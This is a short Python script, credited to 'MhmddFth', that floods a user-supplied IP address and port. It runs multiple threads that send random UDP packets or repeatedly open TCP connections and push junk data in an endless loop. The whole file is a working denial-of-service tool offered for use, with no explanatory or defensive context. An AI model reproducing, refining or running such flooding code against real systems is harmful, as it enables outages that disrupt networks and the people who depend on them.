#!/usr/bin/env python3
import random
import socket
import threading

print("Script By: MhmddFth")
print("Please Input IP And Port")
ip = str(input(" IP:"))
port = int(input(" Port:"))
choice = str(input("Lanjut?(n/y):"))
times = int(input("Packets:"))
threads = int(input("Threads:"))
def run():
	data = random._urandom(1024)
	i = random.choice(("[-]","[-]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" Send To IP!")
		except:
			print("[!] Error!")

def run2():
	data = random._urandom(16)
	i = random.choice(("[-]","[-]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" Send To IP!")
		except:
			s.close()
			print("[*] Error!")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
